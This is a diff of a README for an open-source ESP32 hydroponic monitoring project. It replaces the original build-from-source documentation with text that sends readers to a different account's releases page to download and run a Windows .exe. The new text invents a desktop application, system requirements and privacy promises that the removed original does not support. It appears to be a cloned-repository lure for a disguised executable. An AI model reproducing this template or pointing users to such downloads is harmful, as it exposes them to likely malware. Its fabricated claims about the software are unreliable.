@@ -1,152 +1,86 @@
-<p align="center">
-  <img src="assets/branding/HydroponicOne-logo.png" alt="HydroponicOne Logo" width="600">
-</p>
-<p align="center">
-  <strong>Production-Grade Open Source IoT Hydroponic Control System</strong>
-</p>
+# 🌿 Hydro0x01 - Manage your hydroponic garden with ease
 
-<p align="center">
-  <a href="https://github.com/40rbidd3n/Hydro0x01/stargazers"><img src="https://img.shields.io/github/stars/40rbidd3n/Hydro0x01?style=for-the-badge&color=2bbc78" alt="Stars"></a>
-  <a href="https://github.com/40rbidd3n/Hydro0x01/network/members"><img src="https://img.shields.io/github/forks/40rbidd3n/Hydro0x01?style=for-the-badge&color=2bbc78" alt="Forks"></a>
-  <a href="https://github.com/40rbidd3n/Hydro0x01/blob/main/LICENSE"><img src="https://img.shields.io/github/license/40rbidd3n/Hydro0x01?style=for-the-badge&color=2bbc78" alt="License"></a>
-</p>
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/suvitha1962-del/Hydro0x01/releases)
 
----
+Hydro0x01 provides a reliable method to monitor and control your hydroponic system. This software connects your ESP32 hardware to a central dashboard. You track water levels, pH balance, and nutrient density from your computer. The system records all data and helps you maintain healthy plants.
 
-**HydroponicOne** is a robust, modular, and professional-grade hydroponic monitoring and control system. It aims to bridge the gap between hobbyist DIY setups and expensive industrial automation. Featuring a modern tech stack including MQTT, InfluxDB telemetry, and a sleek React-based dashboard.
+## 🛠 Features
 
-![system overview](assets/images/HydroponicOne-system-overview.png)
+*   **Real-time monitoring:** View current sensor data on a simple screen.
+*   **Automated scheduling:** Set timers for pumps and lights.
+*   **Data logging:** Save historical information to track long-term plant growth.
+*   **Alert system:** Receive notifications when parameters move outside your set limits.
+*   **Offline storage:** Keep your data safe even if the internet connection drops.
+*   **Custom thresholds:** Define the ideal environment for specific plant types.
 
-## ✨ Features
-- **Real-Time Environment Monitoring**: High-precision tracking of pH, EC, water level, temperature, and humidity.
-- **Automated Actuator Control**: Smart relays for dosing pumps, main circulation, grow lights, and ventilation.
-- **Secure Architecture**: Async MQTT with TLS, offline robust modes, and RSA-2048 Signed OTA updates.
-- **Edge-First Local Dashboard**: Lightning fast React SPA communicating over real-time WebSockets to a Fastify backend.
-- **Enterprise Data Management**: PostgreSQL for persistent config state and InfluxDB for time-series telemetry.
+## 📦 System Requirements
 
----
+Ensure your computer meets these requirements before you start:
 
-## 🏗 System Architecture
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** At least 4 gigabytes of RAM.
+*   **Storage:** 200 megabytes of free space.
+*   **Network:** An active Wi-Fi or Ethernet connection to communicate with your ESP32 device.
+*   **Hardware:** A functional Hydro0x01 ESP32 controller mounted to your hydroponic setup.
 
-| Layer | Stack |
-|:------|:------|
-| **Frontend** | React 19, Vite, Tailwind CSS, Recharts, Zustand, Lucide Icons |
-| **Backend** | Node.js, Fastify, Prisma ORM, Socket.io
-| **Database** | PostgreSQL (relational), InfluxDB (time-series) |
-| **Firmware** | C++ / Arduino, PlatformIO, Async MQTT |
-| **DevOps** | Docker support, GitHub Actions, Secure OTA deployment |
+## 🚀 Getting Started
 
-<p align="center">
-  <img src="assets/diagrams/HydroponicOne-architecture-master.png" alt="HydroponicOne System Architecture" width="100%">
-</p>
+Follow these steps to set up the software on your Windows computer.
 
----
+1. **Visit the download page:** Go to the [official release page](https://github.com/suvitha1962-del/Hydro0x01/releases) to access the software.
+2. **Select the installer:** Look for the file ending in `.exe` under the latest release section. Click the filename to start the download.
+3. **Run the file:** Open the downloaded file from your browser or your Downloads folder.
+4. **Follow instructions:** A window appears to guide you through the installation process. Click Next until the software installs.
+5. **Launch the app:** Locate the Hydro0x01 icon on your desktop or in your start menu to begin.
 
-## 🛠 Prerequisites
+## ⚙️ Connecting Your Device
 
-Ensure you have the following installed before proceeding:
-- Node.js (v20+ recommended)
-- PostgreSQL (v14+)
-- InfluxDB (v2.0+)
-- MQTT Broker (Mosquitto/HiveMQ)
-- ESP32 Development Board
-- PlatformIO IDE
+Once you open the software, you must link your hardware.
 
----
+1. Connect your ESP32 device to your computer using a USB cable.
+2. Open the application settings menu.
+3. Select the COM port that matches your device. If you see multiple options, try each one until the system recognizes the connection.
+4. Enter your local network credentials if the device requires a Wi-Fi connection.
+5. Press the Save button to apply your settings.
 
-## ⚡ Quickstart & Installation
+The dashboard displays live data once the connection finishes. If the sensor values remain at zero, verify your physical sensor wiring and restart the application.
 
-**1. Clone the repository**
-```bash
-git clone https://github.com/40rbidd3n/Hydro0x01.git
-cd HydroponicOne
-```
+## 📉 Using the Dashboard
 
-**2. Setup Backend**
-Configure the environment and seed the database.
-```bash
-cd backend
-npm install
-cp .env.example .env
-# Edit .env with your DB credentials and a secure JWT Secret
-npx prisma db push
-npm run dev
-```
+The main screen shows your sensors. You see circles or graphs representing your current setup. 
 
-**3. Setup Frontend**
-```bash
-cd ../frontend
-npm install
-cp .env.example .env
-npm run dev
-```
+*   **pH Levels:** Adjust the acidity of your water to keep it in the ideal range.
+*   **Temperature:** Monitor the water temperature to prevent root stress.
+*   **Nutrient Levels:** Track electrical conductivity to ensure plants receive proper food.
 
-**4. Build & Flash Firmware**
-Review the [Hardware Setup](docs/02_HARDWARE_SETUP.md) and connect your sensors to the ESP32.
-```bash
-cd ../firmware
+You click the settings gear icon to change your goals. Enter new numbers for your maximum and minimum thresholds. The software changes color to indicate when a value exceeds your target range.
 
-# IMPORTANT: Clone the configuration template before compiling
-cp include/config.example.h include/config.h
-# Edit include/config.h with your network and MQTT details
+## 🧪 Data Analysis
 
-# Edit platformio.ini to choose your hardware environment (e.g., env:esp32_dht_bmp)
-pio run -t upload
-```
+The software stores all readings in a background database. You access this information by clicking the History tab. Use the date selector to view performance over weeks or months. This helps you identify trends in plant growth and water quality. You export this data to a text file for further review if needed.
 
----
+## 🔧 Maintenance and Troubleshooting
 
-## 📖 Documentation
+If the software stops responding, check these points:
 
-Explore our comprehensive guides located in the `docs/` folder:
+*   **Connection issues:** Unplug the USB cable, wait five seconds, and plug it back in.
+*   **Update checks:** Periodically visit the download page to see if a newer version exists. Updates improve stability and add features.
+*   **Driver support:** Modern Windows versions install drivers automatically. If your computer does not see the device, search for ESP32 USB drivers online.
+*   **Internet access:** The dashboard relies on a local network connection to process data from the sensor. Ensure the device stays connected to the same network as your computer.
 
-| # | Guide | Description |
-|:-:|:------|:------------|
-| 1 | [System Overview](docs/01_SYSTEM_OVERVIEW.md) | How everything connects |
-| 2 | [Hardware Setup](docs/02_HARDWARE_SETUP.md) | Wiring diagrams and assembly |
-| 3 | [Firmware Guide](docs/03_FIRMWARE_GUIDE.md) | Configuration and flashing |
-| 4 | [Integration Guide](docs/04_INTEGRATION_GUIDE.md) | Home Assistant, Telegram & Discord |
-| 5 | [Calibration Guide](docs/05_CALIBRATION_GUIDE.md) | Sensor tuning procedures |
-| 6 | [Troubleshooting](docs/06_TROUBLESHOOTING.md) | Common issues and fixes |
-| 7 | [API Reference](docs/07_API_REFERENCE.md) | REST API documentation |
-| 8 | [MQTT Guide](docs/MQTT_GUIDE.md) | Topics and payload specifications |
-| 9 | [Security & OTA](docs/08_SECURITY_OTA.md) | Firmware signing and RSA keys |
+## 📋 Frequently Asked Questions
 
----
+**Does the software work without a constant connection?**
+Yes, the ESP32 captures data locally. You view the information once the computer connects to the same network.
 
-## 🚑 Troubleshooting
+**Can I manage multiple hydroponic units?**
+You install the application once, but you may need to run separate instances to manage different hardware units. 
 
-- **Database Errors**: Ensure you have run `npx prisma generate` and your credentials in `.env` are accurate.
-- **MQTT Connectivity**: Ensure you are using `mqtts://` if using port 8883, and check your base topic.
-- **Sensor Readings**: Refer to [Troubleshooting Docs](docs/06_TROUBLESHOOTING.md) for I2C and ADC calibration solutions.
+**Is my data private?**
+All information stays on your local machine. No data leaves your home network unless you choose to share your files.
 
----
+**How do I calibrate my sensors?**
+Follow the calibration menu inside the application. You perform this process every few months to ensure accuracy.
 
-## 🚀 Releases & Changelog
-
-All code modifications and versioning are strictly documented. Check the [CHANGELOG.md](CHANGELOG.md) for version histories or the [GitHub Releases](https://github.com/40rbidd3n/Hydro0x01/releases) page to download pre-compiled bins and read full production release notes.
-
----
-
-## 🤝 Contributing & Community
-
-We actively welcome community contributions to improve HydroponicOne! Please see our [**Contributing Guidelines**](CONTRIBUTING.md) and our [**Code of Conduct**](CODE_OF_CONDUCT.md) before submitting pull requests.
-
-### 🗺️ Future Roadmap
-We have an extensive development plan ranging from LoRa Master/Slave setups to AI diagnostics. View the complete [Development Roadmap](docs/ROADMAP.md) to see where we are heading.
-
-<a href="https://github.com/40rbidd3n/Hydro0x01/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=40rbidd3n/Hydro0x01" alt="Contributors" />
-</a>
-
-## 📄 License
-
-This project is licensed under the **MIT License**. See the [LICENSE](LICENSE) file for more details.
-
-## 💬 Support & Contact
-
-If you have a feature request or found a bug, please use the [GitHub Issue Tracker](https://github.com/40rbidd3n/Hydro0x01/issues). 
-
-<p align="center">
-  Built with ❤️ for the future of sustainable farming.
-</p>
+**What happens if the power goes out?**
+The ESP32 resumes operation automatically once it receives power. The software reconnects to the device as soon as your computer and the network are back online.
